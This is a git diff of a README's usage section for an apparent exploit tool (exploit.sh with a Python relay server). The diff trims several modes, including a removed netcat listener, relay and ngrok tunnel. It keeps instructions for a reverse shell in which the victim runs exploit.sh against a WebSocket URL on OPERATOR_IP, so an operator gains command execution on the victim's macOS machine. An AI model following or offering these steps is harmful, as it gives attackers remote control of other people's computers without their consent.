@@ -27,31 +27,7 @@ Full recording (105s): **[demo.mov](demo.mov)** — opens with GitHub's native p
 
 ## Usage
 
-### Interactive shell (local)
-
-```bash
-bash exploit.sh
-```
-
-### Run a single command
-
-```bash
-bash exploit.sh 'id'
-```
-
 ### Reverse shell to operator
-
-On the operator machine:
-```bash
-nc -lvp 4444
-```
-
-On the victim:
-```bash
-bash exploit.sh --relay OPERATOR_IP:4444
-```
-
-### Remote server (server on a different machine)
 
 On the operator machine:
 ```bash
@@ -62,14 +38,7 @@ S1_BIND=0.0.0.0 python3 server.py --port 8888
 
 On the victim (macOS):
 ```bash
-bash exploit.sh 'ws://OPERATOR_IP:9999/socket.io/?EIO=4&transport=websocket'
-```
-
-### Auto ngrok tunnel
-
-```bash
-bash exploit.sh --ngrok
-# then: nc -lvp 4444 on the operator side
+bash exploit.sh 'ws://OPERATOR_IP:8888/socket.io/?EIO=4&transport=websocket'
 ```
 
 ---
